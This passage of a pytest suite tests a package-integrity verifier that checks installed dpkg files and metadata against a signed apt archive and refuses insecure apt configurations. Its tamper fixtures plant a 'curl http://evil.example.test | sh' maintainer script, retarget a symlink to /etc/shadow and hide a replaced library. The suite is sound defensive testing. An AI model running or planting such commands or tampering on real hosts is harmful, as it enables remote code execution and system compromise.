    bad = host.cli("verify-host", "--record", str(record_file), "--reference", str(wrong_file), *host.flags())
    assert bad.returncode == 1 and "payload drift" in bad.stdout
    right = rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "right", host.archive())
    right_file.write_text(right.render())
    good = host.cli("verify-host", "--record", str(record_file), "--reference", str(right_file), *host.flags())
    assert good.returncode == 0, good.stdout + good.stderr


@pytest.mark.parametrize("installed_label", [True, False], ids=["label-only-on-installed", "label-only-on-archive"])
def test_a_variant_label_alone_is_a_metadata_difference_even_with_identical_files(host, tmp_path, installed_label):
    plain = host.archive()
    if installed_label:
        host.label_installed_as("libc6", "amd64v3")
        archive = plain
    else:
        archive = rr.Archive.__new__(FakeArchive)
        archive.__init__({**plain.debs, "libc6": make_deb(dataclasses.replace(host.specs["libc6"], variant="amd64v3"), "none")})
    record = rr.attest(host.host())
    text = record.render()
    findings = payload_drift(host, rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "ref", archive))
    assert len(findings) == 1 and "package metadata of libc6=" in findings[0], findings


def test_the_interpreter_reference_takes_the_selected_variant_build_and_never_chooses_between_two(tmp_path):
    deb = build_interpreter_deb(tmp_path)
    want = hashlib.sha256(deb.read_bytes()).hexdigest()
    stanza = f"Package: python3.14-minimal\nVersion: 1\nArchitecture: amd64\nArchitecture-Variant: amd64v3\nFilename: pool/python3.14-minimal_1_amd64v3.deb\nSHA256: {want}\n"

    def runner(shown):
        def run(argv, cwd):
            if argv[1] == "show":
                return 0, shown
            shutil.copy(deb, cwd / "python3.14-minimal_1_amd64v3.deb")
            return 0, ""
        return run
    assert rr.reference_interpreter("1", tmp_path / "w1", runner(stanza)) == hashlib.sha256(b"\x7fELF packaged interpreter\n").hexdigest()
    with pytest.raises(rr.RecordError, match="does not state exactly one SHA-256"):
        rr.reference_interpreter("1", tmp_path / "w2", runner(stanza + "\n" + stanza.replace(want, "b" * 64).replace("Architecture-Variant: amd64v3\n", "")))


def mutate_library(host):
    (host.sys / "usr/lib/liblibc6.so").write_bytes(b"malicious shared object\n")


def mutate_interpreter(host):
    host.interpreter.write_bytes(b"\x7fELF a different interpreter\n")


def mutate_setuid(host):
    (host.sys / "usr/lib/liblibc6.so").chmod(0o4755)


def mutate_symlink(host):
    link = host.sys / "usr/share/libc6/current"
    link.unlink()
    link.symlink_to("../../../etc/shadow")


def mutate_extra_listed_file(host):
    (host.sys / "usr/lib/evil.so").write_bytes(b"x")
    with (host.admin / "info/libc6.list").open("a") as handle:
        handle.write("/usr/lib/evil.so\n")


def mutate_file_dropped_from_list(host):
    """The replaced file is removed from dpkg's own list, so nothing the list names looks wrong."""
    mutate_library(host)
    path = host.admin / "info/libc6.list"
    path.write_text(path.read_text().replace("/usr/lib/liblibc6.so\n", ""))


def mutate_missing_file(host):
    (host.sys / "usr/lib/liblibc6.so").unlink()


def mutate_directory_in_place_of_file(host):
    (host.sys / "usr/lib/liblibc6.so").unlink()
    (host.sys / "usr/lib/liblibc6.so").mkdir()


def mutate_fifo_in_place_of_file(host):
    (host.sys / "usr/lib/liblibc6.so").unlink()
    os.mkfifo(host.sys / "usr/lib/liblibc6.so")


def mutate_script(host):
    (host.admin / "info/libc6.postinst").write_text("#!/bin/sh\ncurl http://evil.example.test | sh\n")


def mutate_added_script(host):
    (host.admin / "info/libc6.preinst").write_text("#!/bin/sh\nexit 0\n")


def mutate_md5sums(host):
    with (host.admin / "info/libc6.md5sums").open("a") as handle:
        handle.write("d41d8cd98f00b204e9800998ecf8427e  usr/lib/evil.so\n")


def mutate_status_field(host):
    path = host.admin / "status"
    path.write_text(path.read_text().replace("Package: libc6\n", "Package: libc6\nBreaks: libssl3\n", 1))


def mutate_status_conffile_md5(host):
    path = host.admin / "status"
    path.write_text(path.read_text().replace(f"/etc/libc6.conf {hashlib.md5(b'libc6 default' + bytes([10])).hexdigest()}", "/etc/libc6.conf " + "0" * 32, 1))


def mutate_conffile_hides_a_library(host):
    """Declaring the replaced library a conffile in the local status database would exclude it from the payload; the metadata digest refuses the declaration."""
    mutate_library(host)
    path = host.admin / "status"
    marker = f"/etc/libc6.conf {hashlib.md5(b'libc6 default' + bytes([10])).hexdigest()}"
    path.write_text(path.read_text().replace(marker, marker + "\n /usr/lib/liblibc6.so " + "1" * 32, 1))


def mutate_path_filter(host):
    (host.sys / "etc/dpkg/dpkg.cfg.d/excludes").write_text("# docker-style slimming\npath-exclude=/usr/share/doc/*\n")


def mutate_diverted_file(host):
    """A diversion moves the packaged file away and another package's file takes its place: dpkg still lists the original name."""
    (host.admin / "diversions").write_text("/usr/lib/liblibc6.so\n/usr/lib/liblibc6.so.distrib\nsomepkg\n")
    mutate_library(host)


MALICIOUS = {
    "library content": mutate_library, "interpreter replaced": mutate_interpreter, "setuid bit": mutate_setuid, "symlink retargeted": mutate_symlink,
    "extra listed file": mutate_extra_listed_file, "file dropped from the list": mutate_file_dropped_from_list, "file missing": mutate_missing_file,
    "directory in place of file": mutate_directory_in_place_of_file, "fifo in place of file": mutate_fifo_in_place_of_file, "maintainer script changed": mutate_script,
    "maintainer script added": mutate_added_script, "md5sums changed": mutate_md5sums, "status field changed": mutate_status_field,
    "conffile md5 changed": mutate_status_conffile_md5, "conffile declaration hides a library": mutate_conffile_hides_a_library, "dpkg path filter": mutate_path_filter,
    "diverted file": mutate_diverted_file,
}


@pytest.mark.parametrize("label", sorted(MALICIOUS))
def test_a_same_name_same_version_installed_payload_or_metadata_is_rejected_even_when_an_allowed_archive_offers_that_version(host, label):
    """Finding 1. Everything the pre-existing checks look at stays satisfied: the archive offers exactly this name and version, dpkg --verify (local metadata) reports nothing, the closure,
    versions, sources and origins are the reviewed ones. Only the comparison with the signed-archive package can see that the installed bytes or metadata are not that package."""
    record, record_text, reference = reviewed_reference(host)
    MALICIOUS[label](host)
    live = rr.attest(host.host())
    assert live.render() == record.render() or label == "interpreter replaced", "the attestation of names, versions, sources and origins still passes"
    assert rr.compare(record, live) == [] or label == "interpreter replaced"
    assert rr.verify_files(host.host(), record) == [], "dpkg --verify reports nothing: it only knows the local metadata"
    findings = payload_drift(host, reference)
    assert findings, f"{label}: not rejected"
    assert any(word in " ".join(findings) for word in ("payload drift", "path filters", "special file")), findings


def test_the_command_line_rejects_a_tampered_payload_through_verify_host(host, tmp_path):
    text, reference_text = host.reference()
    record_file, reference_file = tmp_path / "baseline.record", tmp_path / "reference.record"
    record_file.write_text(text)
    reference_file.write_text(reference_text)
    args = ("verify-host", "--record", str(record_file), "--reference", str(reference_file), *host.flags())
    assert host.cli(*args).returncode == 0
    mutate_library(host)
    bad = host.cli(*args)
    assert bad.returncode == 1 and "NO-GO: payload drift: the installed files of libc6=" in bad.stdout, bad.stdout


def test_a_local_conffile_edit_is_host_policy_and_is_not_a_payload_difference(host):
    _, _, reference = reviewed_reference(host)
    (host.sys / "etc/libc6.conf").write_text("an administrator's own setting\n")
    assert payload_drift(host, reference) == []
    (host.sys / "etc/libc6.conf").unlink()
    assert payload_drift(host, reference) == [], "a removed conffile is also local policy"


def test_the_recorded_owner_is_part_of_the_payload(host):
    _, _, reference = reviewed_reference(host)
    foreign = rr.Host(host.admin, host.bin, Path("/usr/bin/python3.14"), host.os_release, root=host.sys, owner_names=lambda uid, gid: ("mallory", "root"))
    findings = rr.payload_findings(foreign, rr.attest(foreign), reference)
    assert findings and all("payload drift" in f for f in findings)


def test_the_reference_build_requires_the_signed_index_digest_and_a_reviewed_origin(host, tmp_path):
    record = rr.attest(host.host())
    text = record.render()
    good = host.archive()
    reference = rr.build_reference(rr.Baseline.parse(text), text, tmp_path / "ok", good)
    assert reference.baseline_sha256 == rr.sha256_bytes(text.encode()) and len(reference.members) == len(record.members)
    with pytest.raises(rr.RecordError, match="differs from the SHA-256 of the archive's signed index"):
        rr.build_reference(record, text, tmp_path / "bad-index", host.archive(index={"libc6": "0" * 64}))
    with pytest.raises(rr.RecordError, match="none of which the baseline record reviewed"):
        rr.build_reference(record, text, tmp_path / "bad-origin", host.archive(origins=("http://ppa.example.test/ubuntu x/main",)))
    swapped = host.archive()
    swapped.debs["libc6"] = swapped.debs["libffi8"]
    with pytest.raises(rr.RecordError):
        rr.build_reference(record, text, tmp_path / "bad-package", swapped)
    (tmp_path / "busy").mkdir()
    (tmp_path / "busy/x").write_text("")
    with pytest.raises(rr.RecordError, match="not empty"):
        rr.build_reference(record, text, tmp_path / "busy", good)


def test_the_default_archive_reads_the_signed_index_and_downloads_exactly_one_package(host, tmp_path):
    record = rr.attest(host.host())
    text = record.render()
    debs = {n: make_deb(s) for n, s in host.specs.items()}
    calls = []

    def run(argv, cwd):
        calls.append(list(argv))
        name = argv[2].split("=")[0] if argv[1] in ("show", "download") else argv[2]
        spec = host.specs[name]
        if argv[1] == "show":
            return 0, f"Package: {name}\nVersion: {spec.version}\nArchitecture: {spec.arch}\nSHA256: {hashlib.sha256(debs[name]).hexdigest()}\n"
        if argv[1] == "madison":
            return 0, f" {name} | {spec.version} | {MIRROR} amd64 Packages\n"
        (cwd / f"{name}_{spec.version.replace(':', '%3a')}_{spec.arch}.deb").write_bytes(debs[name])
        return 0, ""
    reference = rr.build_reference(record, text, tmp_path / "w", rr.Archive(run))
    assert payload_drift(host, reference) == []
    assert {c[0] + " " + c[1] for c in calls} == {"/usr/bin/apt-cache show", "/usr/bin/apt-cache madison", "/usr/bin/apt-get download"}
    assert all(c[1] != "install" for c in calls)
    broken = lambda argv, cwd: (0, "Package: libc6\nVersion: 2.43-2ubuntu1\nArchitecture: amd64\nSHA256: " + "1" * 64 + "\n\nPackage: libc6\nVersion: 2.43-2ubuntu1\nArchitecture: amd64\nSHA256: " + "2" * 64 + "\n")
    with pytest.raises(rr.RecordError, match="does not state exactly one SHA-256"):
        rr.Archive(broken).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path)


def test_an_isolated_apt_configuration_reaches_every_archive_command_and_is_validated(host, tmp_path):
    record = rr.attest(host.host())
    text = record.render()
    debs = {n: make_deb(s) for n, s in host.specs.items()}
    config = tmp_path / "apt.conf"
    config.write_text('Dir::State "/var/tmp/x/state";\nAPT::Architecture-Variants "";\n')
    config.chmod(0o600)
    calls = []

    def run(argv, cwd):
        calls.append(list(argv))
        name = argv[2].split("=")[0] if argv[1] in ("show", "download") else argv[2]
        spec = host.specs[name]
        if argv[1] == "show":
            return 0, f"Package: {name}\nVersion: {spec.version}\nArchitecture: {spec.arch}\nSHA256: {hashlib.sha256(debs[name]).hexdigest()}\n"
        if argv[1] == "madison":
            return 0, f" {name} | {spec.version} | {MIRROR} amd64 Packages\n"
        (cwd / f"{name}_{spec.version.replace(':', '%3a')}_{spec.arch}.deb").write_bytes(debs[name])
        return 0, ""
    rr.build_reference(record, text, tmp_path / "w", rr.Archive(run, config))
    assert calls and all(c[-2:] == ["-c", str(config)] for c in calls), "every apt command carries the isolated configuration, after its positional arguments"
    assert {c[1] for c in calls} == {"show", "madison", "download"}
    calls.clear()
    rr.build_reference(record, text, tmp_path / "w2", rr.Archive(run))
    assert calls and not any("-c" in c for c in calls), "without a configuration the argument vectors are unchanged"

    with pytest.raises(rr.RecordError, match="absolute"):
        rr.Archive(run, Path("apt.conf"))
    with pytest.raises(rr.RecordError, match="cannot be read"):
        rr.Archive(run, tmp_path / "missing.conf")
    link = tmp_path / "link.conf"
    link.symlink_to(config)
    with pytest.raises(rr.RecordError, match="regular file"):
        rr.Archive(run, link)
    config.chmod(0o666)
    with pytest.raises(rr.RecordError, match="not writable by group or others"):
        rr.Archive(run, config)
    with pytest.raises(rr.RecordError, match="regular file"):
        rr.Archive(run, tmp_path)


def test_the_interpreter_reference_passes_the_apt_configuration(tmp_path):
    deb = build_interpreter_deb(tmp_path)
    want = hashlib.sha256(deb.read_bytes()).hexdigest()
    config = tmp_path / "apt.conf"
    config.write_text('APT::Architecture-Variants "";\n')
    config.chmod(0o600)
    calls = []

    def runner(filename):
        def run(argv, cwd):
            calls.append(list(argv))
            if argv[1] == "show":
                return 0, f"Package: python3.14-minimal\nSHA256: {want}\n"
            shutil.copy(deb, cwd / filename)
            return 0, ""
        return run
    digest = rr.reference_interpreter("1", tmp_path / "w1", runner(deb.name), config)
    assert digest == hashlib.sha256(b"\x7fELF packaged interpreter\n").hexdigest()
    assert [c[-2:] for c in calls] == [["-c", str(config)]] * 2
    with pytest.raises(rr.RecordError, match="absolute"):
        rr.reference_interpreter("1", tmp_path / "w3", runner(deb.name), Path("rel.conf"))


def test_the_command_line_offers_the_apt_configuration_only_to_the_reference_commands(tmp_path, capsys):
    for command in ("reference-payload", "reference-interpreter"):
        with pytest.raises(SystemExit):
            rr.main([command, "--help"])
        assert "--apt-config" in capsys.readouterr().out
    assert rr.main(["reference-interpreter", "--version", "1", "--workdir", str(tmp_path / "w"), "--apt-config", "relative.conf"]) == 1
    assert "absolute" in capsys.readouterr().out


def test_the_command_line_refuses_a_bad_apt_configuration_before_it_creates_anything(host, tmp_path, capsys):
    text, _ = host.reference()
    record = tmp_path / "baseline.record"
    record.write_text(text)
    bad = tmp_path / "loose.conf"
    bad.write_text("")
    bad.chmod(0o666)
    for config, word in (("relative.conf", "absolute"), (str(tmp_path / "missing.conf"), "cannot be read"), (str(bad), "not writable by group or others")):
        work = tmp_path / f"w-{word.split()[0]}"
        assert rr.main(["reference-payload", "--record", str(record), "--workdir", str(work), "--apt-config", config]) == 1
        assert word in capsys.readouterr().out and not work.exists()


def index_stanza(name="libc6", version="2.43-2ubuntu1", arch="amd64", sha="1" * 64, **extra):
    fields = {"Package": name, "Version": version, "Architecture": arch, **extra, "SHA256": sha}
    return "".join(f"{k}: {v}\n" for k, v in fields.items())


def test_a_variant_stanza_that_dpkg_still_calls_amd64_is_an_ordinary_index_entry(tmp_path):
    """Real apt 3.2 prints one stanza per version, the one ``APT::Architecture-Variants`` selects: ``Architecture: amd64`` plus ``Architecture-Variant: amd64v3``. The tool takes its digest like any other; it neither refuses nor chooses it."""
    shown = index_stanza(sha="2" * 64, **{"Architecture-Variant": "amd64v3"})
    calls = []

    def run(argv, cwd):
        calls.append(argv[1])
        return (0, shown) if argv[1] == "show" else (0, f" libc6 | 2.43-2ubuntu1 | {MIRROR} amd64 Packages\n")
    assert rr.Archive(run).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path) == ("2" * 64, (MIRROR,))
    assert calls == ["show", "madison"]


def test_two_different_builds_in_the_index_are_never_chosen_between(tmp_path):
    """Should an index ever list the plain and the variant build of one version side by side, the tool does not pick one: the existing exactly-one-SHA-256 rule refuses."""
    shown = index_stanza(sha="1" * 64) + "\n" + index_stanza(sha="2" * 64, **{"Architecture-Variant": "amd64v3"})
    with pytest.raises(rr.RecordError, match="does not state exactly one SHA-256"):
        rr.Archive(lambda argv, cwd: (0, shown)).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path)


def test_another_architecture_of_the_same_version_is_not_a_variant(tmp_path):
    shown = index_stanza(arch="i386", sha="3" * 64) + "\n" + index_stanza(arch="riscv64", sha="6" * 64) + "\n" + index_stanza(sha="1" * 64)

    def run(argv, cwd):
        return (0, shown) if argv[1] == "show" else (0, f" libc6 | 2.43-2ubuntu1 | {MIRROR} amd64 Packages\n")
    assert rr.Archive(run).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path) == ("1" * 64, (MIRROR,))


def test_a_variant_stanza_for_a_different_package_or_version_is_not_this_members_problem(tmp_path):
    shown = index_stanza(name="other", arch="amd64v3", sha="4" * 64) + "\n" + index_stanza(version="9", arch="amd64v3", sha="5" * 64) + "\n" + index_stanza(sha="1" * 64)

    def run(argv, cwd):
        return (0, shown) if argv[1] == "show" else (0, f" libc6 | 2.43-2ubuntu1 | {MIRROR} amd64 Packages\n")
    assert rr.Archive(run).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path)[0] == "1" * 64


def test_an_empty_or_failed_index_is_diagnosed_as_a_missing_source_not_a_digest_problem(tmp_path):
    for status, shown in ((100, ""), (0, ""), (0, "\n"), (100, index_stanza())):
        with pytest.raises(rr.RecordError, match=r"shows nothing for libc6=2.43-2ubuntu1 .*--apt-config"):
            rr.Archive(lambda argv, cwd, r=(status, shown): r).index("libc6", "2.43-2ubuntu1", "amd64", tmp_path)
    with pytest.raises(rr.RecordError, match=r"shows nothing for python3.14-minimal=1 .*--apt-config"):
        rr.reference_interpreter("1", tmp_path / "w", lambda argv, cwd: (100, ""))


def test_an_unreviewed_origin_points_at_the_isolated_configuration(host, tmp_path):
    record = rr.attest(host.host())
    with pytest.raises(rr.RecordError, match=r"none of which the baseline record reviewed \(--apt-config selects the reviewed archive\)"):
        rr.build_reference(record, record.render(), tmp_path / "w", host.archive(origins=("http://regional.example.test/ubuntu resolute-updates/main",)))


def test_the_apt_configuration_must_sit_in_a_directory_nobody_else_can_replace_entries_in(tmp_path):
    directory = tmp_path / "d"
    directory.mkdir()
    directory.chmod(0o755)
    config = directory / "apt.conf"
    config.write_text('APT::Architecture-Variants "";\n')
    config.chmod(0o600)
    assert rr.apt_config_args(config) == ["-c", str(config)]
    directory.chmod(0o777)
    with pytest.raises(rr.RecordError, match="directory of the apt configuration"):
        rr.apt_config_args(config)
    directory.chmod(0o1777)
    assert rr.apt_config_args(config) == ["-c", str(config)], "a sticky directory only lets the owner replace the file"
    directory.chmod(0o770)
    with pytest.raises(rr.RecordError, match="directory of the apt configuration"):
        rr.apt_config_args(config)
    with pytest.raises(rr.RecordError, match="cannot be read"):
        rr.apt_config_args(tmp_path / "nowhere" / "apt.conf")


@pytest.mark.parametrize("switch", ["Acquire::AllowInsecureRepositories", "Acquire::AllowDowngradeToInsecureRepositories", "Acquire::AllowWeakRepositories", "APT::Get::AllowUnauthenticated"])
@pytest.mark.parametrize("value", ["true", "1", "yes", "On"])
def test_an_apt_configuration_that_enables_an_insecure_switch_is_refused(switch, value):
    assert rr.insecure_apt_findings({switch: value}) == [f"{switch} is enabled"]
    assert rr.insecure_apt_findings({switch: "false"}) == rr.insecure_apt_findings({switch: "0"}) == rr.insecure_apt_findings({}) == []


@pytest.mark.parametrize("line", [
    "deb [trusted=yes arch=amd64] http://a.example.test/ubuntu x main",
    "deb [arch=amd64 allow-insecure=yes] http://a.example.test/ubuntu x main",
    "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\nTrusted: yes\n",
    "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\nAllow-Weak: true\n",
])
def test_sources_that_skip_signature_verification_are_refused_wherever_the_configuration_puts_them(tmp_path, line):
    etc = tmp_path / "etc"
    (etc / "parts").mkdir(parents=True)
    (etc / "sources.list").write_text("")
    for where in (etc / "sources.list", etc / "parts" / "extra.sources", etc / "parts" / "extra.list"):
        where.write_text(line + "\n")
        found = rr.insecure_apt_findings({"Dir::Etc::sourcelist": str(etc / "sources.list"), "Dir::Etc::sourceparts": str(etc / "parts")})
        assert found and str(where) in found[0], (where, found)
        where.write_text("")
    ok = "deb [signed-by=/usr/share/keyrings/ubuntu-archive-keyring.gpg arch=amd64] http://a.example.test/ubuntu x main\n"
    (etc / "sources.list").write_text(ok)
    assert rr.insecure_apt_findings({"Dir::Etc::sourcelist": str(etc / "sources.list"), "Dir::Etc::sourceparts": str(etc / "parts")}) == []


def test_relative_apt_source_locations_resolve_under_dir_and_dir_etc(tmp_path):
    (tmp_path / "e").mkdir()
    (tmp_path / "e/s.list").write_text("deb [trusted=yes] http://a.example.test/ubuntu x main\n")
    assert rr.insecure_apt_findings({"Dir": str(tmp_path), "Dir::Etc": "e", "Dir::Etc::sourcelist": "s.list", "Dir::Etc::sourceparts": "none.d"})
    assert rr.insecure_apt_findings({"Dir": "/", "Dir::Etc": str(tmp_path / "e"), "Dir::Etc::sourcelist": "s.list", "Dir::Etc::sourceparts": "none.d"})
    assert rr.insecure_apt_findings({"Dir": str(tmp_path), "Dir::Etc": "e", "Dir::Etc::sourcelist": "other.list", "Dir::Etc::sourceparts": "none.d"}) == []


def test_the_effective_apt_configuration_is_what_apt_reports_and_failure_is_refused():
    dump = 'Acquire::AllowInsecureRepositories "1";\nDir::Etc::sourcelist "/x/sources.list";\nAPT::Architecture-Variants "";\n'
    seen = []
    effective = rr.effective_apt_configuration(Path("/c.conf"), lambda argv: (seen.append(argv), (0, dump))[1])
    assert seen == [["/usr/bin/apt-config", "dump", "-c", "/c.conf"]]
    assert effective == {"Acquire::AllowInsecureRepositories": "1", "Dir::Etc::sourcelist": "/x/sources.list", "APT::Architecture-Variants": ""}
    with pytest.raises(rr.RecordError, match="could not read"):
        rr.effective_apt_configuration(Path("/c.conf"), lambda argv: (100, ""))
    listed = rr.effective_apt_configuration(Path("/c.conf"), lambda argv: (0, 'APT::Architectures "";\nAPT::Architectures:: "amd64";\nAPT::Architectures:: "i386";\nAPT::Architecture-Variants:: "amd64v3";\n'))
    assert listed == {"APT::Architectures": "", "APT::Architectures::": "amd64,i386", "APT::Architecture-Variants::": "amd64v3"}, "a list option is dumped once per item, and every item is kept"


def write_sources(tmp_path: Path, one_line: str = "", parts: dict | None = None) -> dict:
    etc = tmp_path / "etc"
    (etc / "parts").mkdir(parents=True, exist_ok=True)
    (etc / "sources.list").write_text(one_line)
    for name, text in (parts or {}).items():
        (etc / "parts" / name).write_text(text)
    return {"Dir::Etc::sourcelist": str(etc / "sources.list"), "Dir::Etc::sourceparts": str(etc / "parts")}


K = "signed-by=/usr/share/keyrings/ubuntu-archive-keyring.gpg"


@pytest.mark.parametrize("variants", [{"APT::Architecture-Variants": "amd64v3"}, {"APT::Architecture-Variants::": "amd64v3"}, {"APT::Architecture-Variants": "", "APT::Architecture-Variants::": "amd64v2,amd64v3"}, {"APT::Architecture-Variants": "amd64v3, amd64v2"}])
@pytest.mark.parametrize("source", [
    f"deb [arch=amd64 {K}] http://a.example.test/ubuntu x main\n",
    f"deb [{K} arch=amd64] http://a.example.test/ubuntu x main\n",
    f"deb [{K} ARCH=amd64,amd64v3] http://a.example.test/ubuntu x main\n",
    f"deb [{K} arch-=i386] http://a.example.test/ubuntu x main\n",
    f"deb [{K} arch+=amd64v3] http://a.example.test/ubuntu x main\n",
    f"  deb-src [{K} arch = amd64] http://a.example.test/ubuntu x main\n",
    "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\nArchitectures: amd64\n",
    "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\narchitectures-remove: i386\n",
])
def test_a_source_architecture_filter_is_refused_while_architecture_variants_are_configured(tmp_path, source, variants):
    for where in ("sources.list", "parts/extra.list", "parts/extra.sources"):
        etc = write_sources(tmp_path)
        (tmp_path / "etc" / where).write_text(source)
        found = rr.architecture_filter_findings({**etc, **variants})
        assert len(found) == 1 and str(tmp_path / "etc" / where) in found[0] and "remove the filter from the source" in found[0], (where, found)
        assert rr.architecture_filter_findings(etc) == [] and rr.architecture_filter_findings({**etc, "APT::Architecture-Variants": ""}) == [], "with no variant configured the filter is harmless"
        (tmp_path / "etc" / where).write_text("")


def test_sources_without_an_architecture_filter_pass_with_architecture_variants_configured(tmp_path):
    variants = {"APT::Architecture-Variants": "amd64v3"}
    etc = write_sources(tmp_path, f"# deb [arch=amd64 {K}] http://commented.example.test/ubuntu x main\ndeb [{K}] http://a.example.test/ubuntu x main\n"
                        f"deb [{K} lang=none] http://b.example.test/ubuntu x main\n",
                        {"one.sources": "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\nSigned-By: /k.gpg\n# Architectures: amd64\n",
                         "empty.sources": "Types: deb\nURIs: http://a.example.test/ubuntu\nSuites: x\nComponents: main\nArchitectures:\n", "note.txt": "deb [arch=amd64] http://ignored.example.test/ubuntu x main\n"})
    assert rr.architecture_filter_findings({**etc, **variants}) == []
    assert rr.architecture_filter_findings({"Dir::Etc::sourcelist": str(tmp_path / "absent.list"), "Dir::Etc::sourceparts": str(tmp_path / "absent.d"), **variants}) == []


def test_the_architecture_filter_is_refused_before_apt_is_asked_anything(tmp_path):
    config = tmp_path / "apt.conf"
    sources = tmp_path / "sources.list"
    sources.write_text(f"deb [{K} arch=amd64] http://a.example.test/ubuntu x main\n")
    config.write_text("")
    config.chmod(0o600)
    dump = f'Dir::Etc::sourcelist "{sources}";\nDir::Etc::sourceparts "{tmp_path / "none.d"}";\nAPT::Architecture-Variants "amd64v3";\n'
    calls = []
    real = rr.effective_apt_configuration
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(rr, "effective_apt_configuration", lambda path, run=None: real(path, lambda argv: (0, dump)))
        with pytest.raises(rr.RecordError, match="cannot select the architecture variant it names"):
            rr.Archive(lambda argv, cwd: (calls.append(argv), (0, ""))[1], config)
        with pytest.raises(rr.RecordError, match="cannot select the architecture variant it names"):
            rr.reference_interpreter("1", tmp_path / "w", lambda argv, cwd: (calls.append(argv), (0, ""))[1], config)
        sources.write_text(f"deb [{K}] http://a.example.test/ubuntu x main\n")
        assert rr.Archive(lambda argv, cwd: (0, ""), config) is not None
    assert calls == [], "no apt command ran"


@pytest.mark.skipif(not Path("/usr/bin/apt-config").exists(), reason="needs the real apt-config")
def test_the_real_apt_config_refuses_an_unauthenticated_configuration_and_a_broken_one(tmp_path):
    directory = tmp_path / "c"
    directory.mkdir(mode=0o700)
    directory.chmod(0o700)
    for text, message in (('Acquire::AllowInsecureRepositories "true";\n', "Acquire::AllowInsecureRepositories is enabled"),
                          ('APT::Get::AllowUnauthenticated "yes";\n', "APT::Get::AllowUnauthenticated is enabled"),
                          ("this is not apt configuration {{{\n", "could not read the apt configuration")):
        config = directory / "apt.conf"
        config.write_text(text)
        config.chmod(0o600)
        with pytest.raises(rr.RecordError, match=message):
            rr.apt_config_args(config)
        config.unlink()
    config.write_text('APT::Architecture-Variants "";\n')
    config.chmod(0o600)
    assert rr.apt_config_args(config) == ["-c", str(config)]


REAL_APT_TOOLS = ("/usr/bin/apt-cache", "/usr/bin/apt-get", "/usr/bin/apt-config", "/usr/bin/dpkg-deb", "/usr/bin/gpg")


class LoopbackArchive:
    """A throwaway signed repository served over loopback, laid out like Ubuntu's for an architecture variant: one version of one package published as two builds in **two separate indexes**, ``main/binary-amd64/Packages``
    (plain; ``Filename ..._amd64.deb``) and ``main/binary-amd64v3/Packages`` (``Architecture: amd64`` plus ``Architecture-Variant: amd64v3``; ``Filename ..._amd64v3.deb``), each listed with its digest in the signed ``InRelease``.
    ``requested`` records every path apt asked for, so a test can tell which index a configuration actually fetched."""

    def __init__(self, work: Path, keyring: Path, url: str, debs: dict[str, str]) -> None:
        self.work, self.keyring, self.url, self.debs, self.requested = work, keyring, url, debs, []


@pytest.fixture
def loopback_archive(tmp_path):
    import functools
    import http.server
    import threading

    if not all(Path(p).exists() for p in REAL_APT_TOOLS):
        pytest.skip("needs the real apt tools and gpg")
    work = tmp_path / "repo"
    payload = work / "payload"
    (payload / "DEBIAN").mkdir(parents=True)
    (payload / "DEBIAN").chmod(0o755)
    (payload / "usr/share").mkdir(parents=True)
    pool = work / "pool"
    pool.mkdir()
    debs, indexes = {}, {}
    for build, extra, filename in (("plain", "", "route3-e2e_1.0_amd64.deb"), ("amd64v3", "Architecture-Variant: amd64v3\n", "route3-e2e_1.0_amd64v3.deb")):
        # one version, two builds: dpkg's Architecture is amd64 for both, the variant build carries the label and different bytes (as the real archive does)
        (payload / "DEBIAN/control").write_text(f"Package: route3-e2e\nVersion: 1.0\nArchitecture: amd64\n{extra}Maintainer: t <t@example.test>\nDescription: t\n")
        (payload / "usr/share/e2e").write_text(f"e2e {build}\n")
        deb = pool / filename
        subprocess.run(["dpkg-deb", "--build", "--root-owner-group", str(payload), str(deb)], check=True, capture_output=True)
        debs[build] = hashlib.sha256(deb.read_bytes()).hexdigest()
        indexes["binary-amd64" if build == "plain" else "binary-amd64v3"] = (
            f"Package: route3-e2e\nVersion: 1.0\nArchitecture: amd64\n{extra}Maintainer: t <t@example.test>\nFilename: pool/{deb.name}\nSize: {deb.stat().st_size}\nSHA256: {debs[build]}\nDescription: t\n")
    release_hashes = []
    for directory, packages in indexes.items():
        (work / "dists/test/main" / directory).mkdir(parents=True)
        (work / "dists/test/main" / directory / "Packages").write_text(packages)
        release_hashes.append(f" {hashlib.sha256(packages.encode()).hexdigest()} {len(packages)} main/{directory}/Packages\n")
    release = f"Origin: e2e\nSuite: test\nCodename: test\nArchitectures: amd64 amd64v3\nComponents: main\nDate: Thu, 12 Nov 2026 00:00:00 UTC\nSHA256:\n{''.join(release_hashes)}"
    (work / "dists/test/Release").write_text(release)
    gnupg = Path(tempfile.mkdtemp(prefix="r3g"))      # short, unlike pytest's directories: gpg-agent's socket path is limited to about 100 bytes
    if len(str(gnupg)) > 80:
        shutil.rmtree(gnupg, ignore_errors=True)
        pytest.skip("the temporary directory path is too long for a gpg-agent socket")
    gpg_env = {"PATH": "/usr/bin:/bin", "GNUPGHOME": str(gnupg), "LC_ALL": "C"}
    gpg = ["gpg", "--batch", "--yes", "--pinentry-mode", "loopback", "--passphrase", ""]
    try:      # a throwaway key generated here and discarded with the test: apt must verify the index signature like the real archive's
        subprocess.run([*gpg, "--quick-gen-key", "route3 e2e <t@example.test>", "ed25519", "sign", "never"], check=True, capture_output=True, env=gpg_env, timeout=120)
        subprocess.run([*gpg, "--clearsign", "-o", str(work / "dists/test/InRelease"), str(work / "dists/test/Release")], check=True, capture_output=True, env=gpg_env, timeout=120)
        keyring = tmp_path / "e2e-keyring.gpg"
        keyring.write_bytes(subprocess.run([*gpg, "--export"], check=True, capture_output=True, env=gpg_env, timeout=120).stdout)
    finally:
        subprocess.run(["gpgconf", "--kill", "gpg-agent"], capture_output=True, env=gpg_env, timeout=60, check=False)
        shutil.rmtree(gnupg, ignore_errors=True)
    requested: list[str] = []

